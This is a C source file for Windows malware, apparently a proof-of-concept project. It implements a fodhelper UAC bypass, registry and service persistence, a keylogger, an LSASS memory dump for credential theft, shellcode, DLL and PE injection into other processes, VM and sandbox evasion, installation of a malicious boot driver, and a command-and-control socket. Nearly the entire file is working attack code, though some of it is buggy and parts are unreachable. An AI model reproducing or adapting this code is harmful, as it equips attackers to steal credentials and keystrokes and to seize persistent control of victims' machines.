//Running states
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN  
//Constant directories
#define PRESISTENCE_REGISTERY_PATH L"\"Software\\Microsoft\Windows\\CurrentVersion\\Run\""
#define HKCU_UAC_BYPASS_PATH L"Software\\Classes\\ms-settings\\shell\\open\\command"
#define SECURITY_ACCOUNT_MANAGER_PATH L"C:\\Windows\\System32\\config\\SAM"
#define COMMAND_LINE_PIPE  L"C:\\Users\\ilay\\Downloads\\ms-commands.txt"
#define COMMAND_LINE_EXECUTE " > C:\\Users\\ilay\\Downloads\\ms-commands.txt"
#define MALICIOUS_DRIVER_PATH L"c:\\Users\\ilay\\Downloads\\ms-mini.txt"
#define KEY_LOGGING_FILE_PATH L"c:\\Users\\ilay\\Downloads\\logging.txt"
#define MINI_DUMP_FILE  L"c:\\Users\\ilay\\Downloads\\Mini.txt"
#define DATA_FROM_INJECTION L"C:\\Windows\\System32\\Creds.txt"
#define HOOKER_DLL L"C:\\Users\\ilay\\source\\repos\\HookerDll\\x64\\Debug\\HookerDll.dll"
//other constants
#define PE_INJECTION_PROCESSA "notepad.exe"
#define PE_INJECTION_PROCESSW L"notepad.exe"
#define SENDING_HOUR 20  
#define DATA_LIMIT_SENDING 3000  
#define SECRET_SERVICE_NAME L"ms-SecretService"
#define SECRET_SERVICE_NAME_C "ms-SecretService"
#define KEY_PRESSING_STSTUS_CODE -32767
#define LSASS_NAME L"lsass.exe"
#define COMMAND_AND_CONTROL_ADDRESS "127.0.0.1"
#define PORT 8081
#define DEFAULT_BUFFER_LENGTH 512
#define KEYLOGGING_COMMAND "GetKeyStrokes"
#define DEBUG_PRIVS_NAME L"SeDebugPrivilege"
#define LSASS_PARSING_COMMAND "tasklist | findstr lsass.exe"
#define LSA_PREMISSION "Everyone"



//Headers
#include <Windows.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <stdlib.h>
#include <stdio.h>
#include <shlobj_core.h>
#include <DbgHelp.h>
#include <TlHelp32.h>
#include <minidumpapiset.h>
#include <NTSecAPI.h>
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")



//msfvenom assembly opcodes shellcode


//strucs
typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

//Privilege escelation modle
void UACBypass()
{
	//getting the current working directory 
	wchar_t DirName[1000];
	GetModuleFileNameW(NULL, DirName, 1000);

	//innitializing registery tree
	HKEY RegisteryKey;
	LONG RegKey = RegCreateKeyEx(HKEY_CURRENT_USER,
		HKCU_UAC_BYPASS_PATH,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		MAXIMUM_ALLOWED,
		NULL,
		&RegisteryKey,
		NULL);
	if (RegKey != ERROR_SUCCESS)
	{
		printf("%s", "Error while creating registery entry\n");
	}



	//setting malicious registery entries
	LONG Code = RegKey = RegSetValueEx(
		RegisteryKey,
		TEXT("DelegateExecute"),
		0,
		REG_SZ,
		TEXT(""),
		sizeof(TEXT("") + 1));

	if (Code != ERROR_SUCCESS)
	{
		printf("%s\n", "An error while setting registery value");
		exit(1);
	}



	Code = RegSetValueEx(
		RegisteryKey,
		TEXT(""),
		0,
		REG_SZ,
		DirName,
		sizeof(DirName) + 1);
	if (Code != ERROR_SUCCESS)
	{
		printf("%s\n", "An error while setting registery value");
		exit(1);
	}


	//Saving Changes
	RegCloseKey(RegisteryKey);
	//calling fodhelper.exe to execute the malware again and create an admin instance of it
	system("start fodhelper.exe"); //fodhelper.exe is responsible for different features in windows sttings

}


//(file handler,data to write)=>updated file
void WriteToFile(FILE* Handler, char Data)
{
	fprintf(Handler, Data);
	fprintf(Handler, " ");
}






//CommandLineExecution(no output redirection!)
char* RunCmdCommand(char* Command)
{
	system(Command);
}




//Checking weather the malware instance is running as an adminisitor
bool IsRunningAdmin()
{
	return IsUserAnAdmin();
}





//winapi hiding window
void HideOutputWindow()
{
	HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 0);
}




//winapi Show window
void ShowOutputWindow()
{
	HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 5);
}



// Keylogging option
int StartKeyLogging(HANDLE* FileHandler)
{

	fprintf(FileHandler, "Keylogging started\n");
	while (true)
	{

		bool CapsLocks = false;
		for (char Key = 8; Key < 256; Key++)
		{
			
			if (GetAsyncKeyState(Key) == KEY_PRESSING_STSTUS_CODE)
			{
				switch ((int)Key)
				{
				case 20:
					CapsLocks = true;
					break;
				case ' ':
					fprintf(FileHandler, "%s", "[SPACE] ");
					break;
				case 13:
					fprintf(FileHandler, "%s", "[ENTER] ");
					break;
				case 9:
					fprintf(FileHandler, "%s", "[TAB] ");
					break;
				case 8:
					fprintf(FileHandler, "%s", "[BACKSPACE] ");
					break;
				case 27:
					fprintf(FileHandler, "%s", "[ESCAPE] ");
					break;
				case 18:
					fprintf(FileHandler, "%s", "[ALT] ");
					break;
				case 19:
					fprintf(FileHandler, "%s", "[BREAK] ");
					break;
				case 16:
					fprintf(FileHandler, "%s", "[SHIFT] ");
					break;
				case 37:
					fprintf(FileHandler, "%s", "[LEFT-ARROW] ");
					break;
				case 38:
					fprintf(FileHandler, "%s", "[UP-ARROW] ");
					break;
				case 39:
					fprintf(FileHandler, "%s", "[RIGHT-ARROW] ");
					break;
				case 40:
					fprintf(FileHandler, "%s", "[DOWN-ARROW] ");
					break;
				case 45:
					fprintf(FileHandler, "%s", "[INSERT] ");
					break;
				case 46:
					fprintf(FileHandler, "%s", "[DELETE] ");
					break;

				default:
					if (CapsLocks)
					{
						fprintf(FileHandler, "%c", toupper(Key));
						fprintf(FileHandler, "%c", " ");

					}
					else
					{
						fprintf(FileHandler, "%c", tolower(Key));
						fprintf(FileHandler, "%c", " ");
					}
					break;

				}

			}
		}

	}

}






// Adds a registery key that will load the program at startup
void MakeMalwarePresistence()
{
	//Opening a registery key
	HKEY RegisteryKey = NULL;
	LONG CODE = RegOpenKeyW(HKEY_LOCAL_MACHINE, PRESISTENCE_REGISTERY_PATH, &RegisteryKey);
	if (CODE != ERROR_SUCCESS)
	{
		printf("%s", "Error while opening Registery key\n");
		exit(1);

	}

	//Retriving the malware's exe path
	wchar_t DirName[1000];
	GetModuleFileNameW(NULL, DirName, 1000);
	//printf("%s", DirName);

	//Creating a new Registery entry("PocReverseShell,<ExePath>)

	LONG Code = RegSetValueExW(
		RegisteryKey,
		TEXT("PocRansomware"),
		0,
		REG_SZ,
		DirName,
		sizeof(DirName) + 1);

	if (Code != ERROR_SUCCESS)
	{
		printf("%s", "Error while inserting a new registery entry\n");
		exit(1);
	}
	//Closing Registery and saving changes
	RegCloseKey(RegisteryKey);
	//in case of success the program will load at startup
}






void CreateOwnService()
{
	//retriving path to executable
	wchar_t DirName[1000];
	GetModuleFileNameW(NULL, DirName, 1000);


	//Service Managment handler
	SC_HANDLE ServiceManagerHandler = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	//Service Handler
	SC_HANDLE ServiceHandler = CreateService(
		ServiceManagerHandler,
		SECRET_SERVICE_NAME,
		SECRET_SERVICE_NAME,
		SERVICE_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS,
		SERVICE_AUTO_START,
		SERVICE_ERROR_NORMAL,
		DirName,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL);


	//Checking if service had been created
	if (ServiceHandler == NULL)
	{
		printf("CreateService failed (%d)\n", GetLastError());	
		exit(1);
	}
	//Closing the service handler and the Service Managaer Handler
	CloseServiceHandle(ServiceHandler);
	CloseServiceHandle(ServiceManagerHandler);


	//Service had been created successfully
	printf("%s", "Service Created Successfully!\n"); 
	//CloseServiceHandle(ServiceHandler);

	if (StartServiceW(ServiceHandler, 0, NULL) == 0)
	{
		printf("ServiceStarting has failed (%d)", GetLastError());


	}

}






void ConfigureMaliciousDriver(wchar_t* DriverPath)
{

	//The program uses its high priveleges in order to configure a new service to a malicious driver/
	//by doing that the program will gain a full access to the kernrl!

	wchar_t* DriverFullPath = DriverPath;
	//Service Managment handler
	SC_HANDLE ServiceManagerHandler = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);


	//Service Handler

	//NOTE! path must contain system root in order to be a boot driver
	SC_HANDLE ServiceHandler = CreateService(
		ServiceManagerHandler,
		TEXT("m1c440$0ft-l3g1t1m4t31c-D41v3r"),
		TEXT("ms-microsoftware"),
		SERVICE_ALL_ACCESS,
		SERVICE_KERNEL_DRIVER,
		SERVICE_BOOT_START,//Note!-set DEMAND to avoid BSOD
		SERVICE_ERROR_IGNORE,
		DriverFullPath,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL);


	//Checking if service had been created
	if (ServiceHandler == NULL)
	{
		printf("Service creation has failed (%d)\n", GetLastError());
		exit(1);
	}

	//Service had been created successfully
	printf("%s", "Service Created Successfully!\n");
	CloseServiceHandle(ServiceHandler);


	//starting service

	if (StartServiceW(ServiceHandler, 0, NULL) == 0)
	{
		printf("ServiceStarting has failed (%d)", GetLastError());

	}

}




//CMD Output Redirection
char* GetCommandLineOutPut(char* Command)
{
	//Starting empty buffers with NULLS
	char* Buffer   = (char*)calloc(2048, sizeof(char));
	char* FinalOutput = (char*)calloc(100000, sizeof(char));
	//Checking if the memory allocated
	if (Buffer && FinalOutput == NULL)
	{
		printf("Error allocating memory(%d)", GetLastError());
	}


	FILE* FileHandler;
	FileHandler = _popen(Command, "r");
	while (fgets(Buffer, 2048, FileHandler) != NULL)
	{
		strcat(FinalOutput, Buffer);
	}


	fclose(FileHandler);
	return FinalOutput;  //Note-freeing Final output!!

}

char* ReadKeyloggingData(FILE* KeyLoggingFile)
{

	//Getting file size
	long Size;
	fseek(KeyLoggingFile, 0L, SEEK_END);
	Size = ftell(KeyLoggingFile);
	rewind(KeyLoggingFile);

	//Starting empty buffers with NULLS
	char* Buffer = (char*)calloc(1024, sizeof(char));
	char* FinalOutput = (char*)calloc(Size, sizeof(char));

	if (Buffer && FinalOutput == NULL)
	{
		printf("Error allocating memory(%d)", GetLastError());
	}

	//Copieng from file to char*
	while (fgets(Buffer, 1024, KeyLoggingFile) != NULL)
	{
		strcat(FinalOutput, Buffer);
	}
	//Flushing current content 
	freopen(KEY_LOGGING_FILE_PATH, "w", KeyLoggingFile);
	free(Buffer);
	//()=>KeyLogging data
	return FinalOutput;

}




void SendDataToServer(char* Data, SOCKET* socket)
{
	if (send(socket, Data, strlen(Data), 0) < 0)
	{
		printf("A socket error(%d)", GetLastError());
	}
}




char* GetDataFromServer(SOCKET* Socket)
{
	char* Buffer = (char*)calloc(18000, sizeof(char));
	if (recv(Socket, Buffer, 18000, 0) < 0)
	{
		printf("Socket error(%d)", GetLastError());

	}
	return Buffer;
	//Note!-Free the memory of the Buffer
}





int IsServiceRunning()
{

	int Length = strlen("sc queryex type= service state= all | findstr ") + strlen("ms-Microsoft-Essentials") + 1;
	char Command[100] = "sc queryex type= service state= all | findstr ";
	char Argument[] = SECRET_SERVICE_NAME_C;
	strcat(Command, Argument); //connecting to strings to the command: 
	//sc queryex type= service state= all
	//| findstr ms-Microsoft-Essentials
    //Executing the command
	char* Service = GetCommandLineOutPut(Command);
	int Exists = strstr(Service, Argument);
	return Exists;




}



int GetLsassProcessIdentifier()
{
	//getting the output of cmd command "tasklist | findstr lsass.exe"
	//the output is some data of the lsass process
	char* Out = GetCommandLineOutPut("tasklist | findstr lsass.exe");

	//Parsing the data of lsass 
	char* ProcessId = strtok(Out, " ");

	//taking the first token which is the pid
    ProcessId = strtok(NULL, " ");

	//converting it to int
	int IntProcessId;
	sscanf(ProcessId, "%d", &IntProcessId);
	//returning lsass's pid
	return IntProcessId;

}



BOOL GainDebuggingPrivilege()
{
	HANDLE PrivilegeToken;
	TOKEN_PRIVILEGES PrivilegeData;
	//uniqe locally uniqe identifier
	LUID Luid;



	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &PrivilegeToken))
	{
		printf("OpenProcessToken Error(%d)\n", GetLastError());
		return FALSE;

	}



	//retriving current process's token handler
	if (!LookupPrivilegeValue(0, DEBUG_PRIVS_NAME, &Luid))
	{
		printf("LookupPrivilege Error(%d)\n", GetLastError());
		return FALSE;
	}

	PrivilegeData.Privileges[0].Luid = Luid;
	PrivilegeData.PrivilegeCount = 1;
	PrivilegeData.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(PrivilegeToken, FALSE, &PrivilegeData, 0,0, 0))
	{
		printf("AdjustPrivilegeError(%d)\n",GetLastError());
		return FALSE;
	}

	CloseHandle(PrivilegeToken);
	return TRUE;


}



char* GetAccoumtName()
{
	return GetCommandLineOutPut("whoami");
}

void SetDebugPrivilegeForAdmin()
{
	
	LSA_UNICODE_STRING LusName;
	NTSTATUS Status;
	LSA_HANDLE LSAHanler;
	LSA_OBJECT_ATTRIBUTES ObjectAttributes;
	wchar_t* SysName = NULL;
	USHORT SystemNameLength;
	
	ZeroMemory(&ObjectAttributes, sizeof(ObjectAttributes));

	SystemNameLength = wcslen(SysName);
	LusName.Buffer = SysName;
	LusName.Length = SystemNameLength * sizeof(WCHAR);
	LusName.MaximumLength = (SystemNameLength + 1) * sizeof(WCHAR);

	Status = LsaOpenPolicy(
		&LusName,    //Name of the target system.
		&ObjectAttributes, //Object attributes.
		POLICY_ALL_ACCESS, //Desired access permissions.
		&LSAHanler //Receives the policy handle.
	);



}




char* DumpLsassExe()
{
	//Creting lsass's process handler
	DWORD ProcessId = (DWORD)GetLsassProcessIdentifier();
	HANDLE LsassHandler;
	LsassHandler= OpenProcess
	(
		PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 
		0, 
		ProcessId
	);

	if (LsassHandler == NULL)
	{
		printf("Lsass Error(%d)\n", GetLastError());
	}
	
	//Creating a text file to hold the dumped lsass data
	HANDLE LsassMinidump = CreateFileW
	(MINI_DUMP_FILE, GENERIC_READ | GENERIC_WRITE,
		0,
		NULL, 
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_ARCHIVE | SECURITY_IMPERSONATION, 
		NULL);
	
	if(LsassMinidump == NULL)
	{
		printf("Output Error(%d)\n", GetLastError());
	}

	//Creaing dumped datat to the file
	int code=MiniDumpWriteDump(
		LsassHandler, 
		ProcessId, 
		LsassMinidump, 
		(MINIDUMP_TYPE)0x00000002,
		NULL,
		NULL,
		NULL);
	CloseHandle(LsassMinidump);

	
}



void RemoteShellcodeExecuetion(DWORD ProcessId,char*Shellcode)
{
	HANDLE Process, Thread;
	LPVOID ReservedMemory;

	Process = OpenProcess(
		PROCESS_ALL_ACCESS,
		TRUE,
		ProcessId);

	ReservedMemory=VirtualAllocEx(Process,
		NULL, 
		sizeof(Shellcode),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	WriteProcessMemory(Process,
		ReservedMemory,
		Shellcode, 
		sizeof(Shellcode), 
		NULL);

    Thread = CreateRemoteThread(Process,
		NULL, 
		0, 
		(LPTHREAD_START_ROUTINE)ReservedMemory,
		NULL, 
		0, 
		NULL);

	CloseHandle(Process);




}















int ValidateManufatorer()

{
	int ret;
	char* Command = GetCommandLineOutPut("An Error while searching for diturbing Services");
	if (strstr(Command, "VM") == NULL || strstr(Command, "VirtualBox") || strstr(Command, "vm"))
	{
		free(Command);
		return 0;
	}
	free(Command);
	return 1;
}



int ValidateBiosId()
{
	char* Command;
	Command = GetCommandLineOutPut("wmic bios get serialnumber");
	Command=strtok(Command, "\n");
	Command = strtok(NULL, "\n");
	int i = 0;
	while (*(Command + i) != ' ')
	{
		i++;
	}
	Command[i] = '\0';
	int NumberOfDigits=strlen(Command);
	if (NumberOfDigits > 25)
	{
		return 0;
	}
	return 1;

	

}

int RemoteDllInjection(int Pid )
{
	HANDLE Process,Thread;
	PVOID RemoteBuffer;
	wchar_t HookerPath[] = HOOKER_DLL;

	Process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)Pid);

	RemoteBuffer = VirtualAllocEx(Process, NULL, sizeof (HookerPath), MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(Process, RemoteBuffer, (LPVOID)HookerPath, sizeof (HookerPath), NULL);

	PTHREAD_START_ROUTINE Address = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
	Thread=CreateRemoteThread(Process, NULL, 0, Address, RemoteBuffer, 0, NULL);

	CloseHandle(Process);
	return GetThreadId(Thread);



}



DWORD InjectionEntryPoint()
{
	//HideOutputWindow();
	CHAR moduleName[128] = "";
	GetModuleFileNameA(NULL, moduleName, sizeof(moduleName));
	while (TRUE)
	{
		MessageBoxA(NULL, moduleName, "My malware is now injected into RuntimeBroker!", NULL);
	}

	return 0;
}










int ProcessInjection()
{
	//starting the process to get injected intoo
	system("start RuntimeBroker.exe");
	//getting the output of cmd command "tasklist | findstr <RemoteprocessName>.exe"
	//the output is some data of the Remote process
	char* Out = GetCommandLineOutPut("tasklist | findstr RuntimeBroker.exe");

	//Parsing the data of Remote Process 
	char* ProcessId = strtok(Out, " ");

	//taking the first token which is the pid
	ProcessId = strtok(NULL, " ");

	//converting it to int
	int IntProcessId;
	sscanf(ProcessId, "%d", &IntProcessId);



	//The current exe image base addr. the first header in the exe is the DOS-HEADER.
	//Any addr in the exe is relative to the image base (RVA).
	PVOID CurrentImage = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)CurrentImage;




	//Inside the DOS-HEADER the e_lfanew field contains 
	//the addr of the next hedaer, the NT-HEADER
	//in order to get the actual address of NTHEDAER and not just the rva the
	//addres will be the sum of the image base and the elfnaw
	PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)CurrentImage + DosHeader->e_lfanew);


	// Allocating a new memory block that will contain the while PE image
	PVOID MainImage = VirtualAlloc(
		NULL,
		NtHeader->OptionalHeader.SizeOfImage,
		MEM_COMMIT,
		PAGE_READWRITE);


	//copying the curent PE image to a temp memory block
	memcpy(MainImage,
		CurrentImage,
		NtHeader->OptionalHeader.SizeOfImage);

	//Openning the remote process prior to the process identifier extracted from tasklist
	HANDLE RemoteInjectedProcess = OpenProcess(
		MAXIMUM_ALLOWED,
		FALSE,
		(DWORD)IntProcessId);


	// Allocating a new memory block on the target process
	PVOID targetImage = VirtualAllocEx(
		RemoteInjectedProcess,
		NULL,
		NtHeader->OptionalHeader.SizeOfImage,
		MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);

	//because of the fact that the process will be loaded into a new image,
	//it's image base addr might be changed but the other addreses in the relocation
	//table remain the same so we must change the values in the reloc table prior the 
	//change in the image base addrs
	//now ill edit the copy of the image relocation table so that the new 
	//process will be able to resolve the adresses currectly
	DWORD_PTR DifferenceBetweenImages = (DWORD_PTR)targetImage - (DWORD_PTR)CurrentImage;



	PDWORD_PTR PatchedAddresses;

	PBASE_RELOCATION_ENTRY RelocTableRelativeAddress = 0;



	//getting to the relocation table of the
	//memory copy by adding the base image with the 
	//RVA of nthedaer=>optionalheader=>DataDirectories=>virtual address
	PIMAGE_BASE_RELOCATION RelocTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)MainImage + NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

	//will be used in the inner loop in order to iterate each relocation entry
	DWORD RelocEntriesCounter = 0;



	while (RelocTable->SizeOfBlock > 0)
	{
		//the number of entries is calculating by getting to the relocation's table block,
		// the block size that contains the size of the image base relocation.
		//by substracting the image base relocation size well get the size only 
		//of the block. each block contains 2 bytes, 1 for address and 1 for type
		RelocEntriesCounter = (RelocTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / (sizeof(int) / 2);
		//proceeding blocks
		RelocTableRelativeAddress = (PBASE_RELOCATION_ENTRY)(RelocTable + 1);

		for (short i = 0; i < RelocEntriesCounter; i++)
		{
			if (RelocTableRelativeAddress[i].Offset == 1)
			{
				PatchedAddresses = (PDWORD_PTR)((DWORD_PTR)MainImage + RelocTable->VirtualAddress + RelocTableRelativeAddress[i].Offset);
				*PatchedAddresses += DifferenceBetweenImages;
			}
		}
		RelocTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)RelocTable + RelocTable->SizeOfBlock);
	}

	// Write the relocated localImage into the target process
	WriteProcessMemory(
		RemoteInjectedProcess,
		targetImage,
		MainImage,
		NtHeader->OptionalHeader.SizeOfImage,
		NULL);

	// Start the injected PE inside the target process
	CreateRemoteThread(
		RemoteInjectedProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + DifferenceBetweenImages),
		NULL,
		0,
		NULL);

	return 0;
}









int main()
{
	FILE* KeyLogggingFile = fopen(KEY_LOGGING_FILE_PATH, "w+");//read+write
	StartKeyLogging(KeyLogggingFile);
	//sandbox escaper modle
	if (!ValidateBiosId() && !ValidateManufatorer())
	{
		exit(0);
	}

	



	//Hiding the whole user console by using winapi "ShowWindow"
	//HideOutputWindow();
	////////////////////////////////////////
	//From now on every instance is invisible
	/////////////////////////////////////////

	//Adminisitor check
	if (!IsRunningAdmin()==1)
	{
		//this code happens as  non admin
		UACBypass();
		//waits for the payload
		Sleep(10000);
		//exits
		exit(1);
	}



	

	/////////////////////////////////////////
	//This section happens as an adminisitor and can be injected into runtime broker!!
	/////////////////////////////////////////
	
	scanf("%s");
	printf("%s", "Press enter to dump lsass=>\n");
	GainDebuggingPrivilege();
	DumpLsassExe();
	printf("%s", "Lsass is dumped!, check the dump file!\n Press enter to start keylogging=>");
	scanf("%s");
	

	HANDLE KeyLoggingFile = CreateFileW
	(KEY_LOGGING_FILE_PATH, GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_ARCHIVE | SECURITY_IMPERSONATION,
		NULL);

	StartKeyLogging(KeyLogggingFile);
	scanf("%s");
	exit(1);
	//Making the malware presistance by adding 
	//registery entries to CurrentVersion/Run
	MakeMalwarePresistence();
	

	//Socket Creation
	SOCKET Socket;
	struct sockaddr_in SocketAddr;
	WSADATA WSA;
	char* IpAddress = COMMAND_AND_CONTROL_ADDRESS;
	int Port = PORT;
	//starting WSA
	WSAStartup(MAKEWORD(2, 2), &WSA);

	//The communication socket
	Socket = socket(AF_INET, SOCK_STREAM, 0);
	//The communication socket


	//setting server's address
	SocketAddr.sin_port = htons(Port);
	SocketAddr.sin_addr.s_addr = inet_addr(IpAddress);
	SocketAddr.sin_family = AF_INET;


	//Connecting to the server
	int code = connect(Socket, (struct sockaddr*)&SocketAddr, sizeof(SocketAddr));
	if (code < 0)
	{
		printf("Socket error(%d)", GetLastError());
	}
	// Socket Creation

	//Key Logger setup

	//Keylogging File Creation 
	

}
